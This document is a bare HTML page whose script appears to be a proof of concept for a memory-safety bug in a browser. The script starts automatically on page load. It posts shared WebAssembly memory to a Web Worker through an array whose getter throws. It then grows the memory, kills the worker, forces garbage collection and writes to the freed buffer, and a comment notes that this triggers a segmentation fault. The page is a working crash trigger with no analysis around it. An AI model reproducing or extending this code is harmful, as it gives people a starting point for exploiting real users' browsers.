<!DOCTYPE html>
<html>
<body>
<script id="worker1">
    self.onmessage = function(e) {
        self.postMessage('reply from worker1');
    };
</script>
 
<script>
    
    function gc(){
    for (var i = 0; i < 200; i++)
        new ArrayBuffer(0x100000);
    }
    function cb(){
      throw(1);
    }
 
    function start(){
        var mem = new WebAssembly.Memory({ initial: 1, maximum : 12, shared : true });
        var arr = [mem];
        arr.__defineGetter__(1, cb); 
        var blob = new Blob([
            document.querySelector('#worker1').textContent
            ], { type: "text/javascript" });
 
        var worker = new Worker(window.URL.createObjectURL(blob));
 
        worker.onmessage = function(e) {
            console.log("Received: " + e.data);
        }
        try{
            worker.postMessage(arr); 
        }catch(e){
            mem.grow(1);
            worker.terminate();
            gc();
            var dv = new DataView(mem.buffer);
            dv.setUint8(0, 0);            // will trigger segment fault
        }
    }
    start();
</script>
</body>
</html>
